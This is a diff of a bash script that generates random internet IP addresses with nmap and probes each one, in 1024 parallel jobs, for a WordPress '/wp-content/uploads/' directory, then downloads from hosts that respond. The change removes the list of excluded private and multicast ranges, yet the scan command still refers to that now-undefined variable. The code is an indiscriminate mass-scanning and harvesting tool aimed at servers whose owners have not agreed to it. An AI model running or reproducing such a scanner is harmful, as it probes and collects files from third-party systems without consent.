@@ -2,8 +2,6 @@
 
 readonly DIR='/wp-content/uploads/'
 
-readonly BL_IPS='10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,224-255.-.-.-'
-
 ip_gen() {
     nmap -n -iR 1000000 -sL --exclude "${BL_IPS}" | awk '/report for/ {print $NF}'
 }
@@ -22,5 +20,6 @@ download() {
 
 export -f check
 export -f download
+export DIR
 
 ip_gen | xargs -P 1024 -I {} bash -c 'check {} && echo {} && download {}'
